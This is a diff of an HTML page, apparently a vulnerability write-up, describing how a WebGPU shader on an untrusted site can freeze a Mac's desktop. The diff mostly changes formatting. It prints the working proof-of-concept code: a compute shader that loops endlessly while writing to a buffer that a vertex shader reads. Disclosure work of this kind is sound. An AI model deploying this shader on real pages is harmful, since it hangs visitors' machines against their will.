@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html>
   <head>
+    <link rel="stylesheet" href="https://auberon.xyz/style.css">
     <link rel="stylesheet" href="./style.css">
   </head>
   <body>
 
-    <hgroup>
-      <h1>The Mac Deathray</h1>
-      <p>A simple way for an untrusted site to freeze a Mac</p>
-    </hgroup>
+    <main>
+    <h1>The Mac Deathray</h1>
+    <p>A simple way for an untrusted site to freeze a Mac</p>
 
     <h2>TL;DR</h2>
     <p>A WebGPU shader on an untrusted site can hang a Mac's graphics, making the Desktop UI unusable until a restart is forced. All the victim needs to do is click a link. This issue reproduces cross-browser on MacOS, but not other OSes.</p>
@@ -78,9 +78,10 @@
 @group(0) @binding(0) var<storage, read_write> data : array<vec4f>; 
 
 @compute @workgroup_size(1) fn compute() {
-        for(var i = 0u; i &lt; 1;) { // no i++, loop spins endlessly
-            data[i+1] = data[i];
-        }
+  // no i++, loop spins endlessly
+  for(var i = 0u; i &lt; 1;) { 
+    data[i+1] = data[i];
+  }
 }
       </code>
     </pre>
@@ -90,13 +91,15 @@
       <code>
 @group(0) @binding(0) var<storage, read> data : array<vec4f>; 
 
-@vertex fn vert(@builtin(vertex_index) vertexIdx : u32) -> @builtin(position) vec4f {
-    let datum = data[vertexIdx]; // attempts to read from same buffer the compute shader writes to
-    return datum;
+@vertex fn vert(@builtin(vertex_index) vertexIdx : u32)
+              -> @builtin(position) vec4f {
+  // attempts to read from same buffer the compute shader writes to
+  let datum = data[vertexIdx]; 
+  return datum;
 }
 
 @fragment fn frag(@builtin(position) pos : vec4f) -> @location(0) vec4f {
-    return pos;
+  return pos;
 }
       </code>
     </pre>
@@ -127,5 +130,6 @@
 
     <p>Yours truly,</p>
     <p>Auberon L&oacute;pez (they/them)</p>
+    </main>
   </body>
 </html>
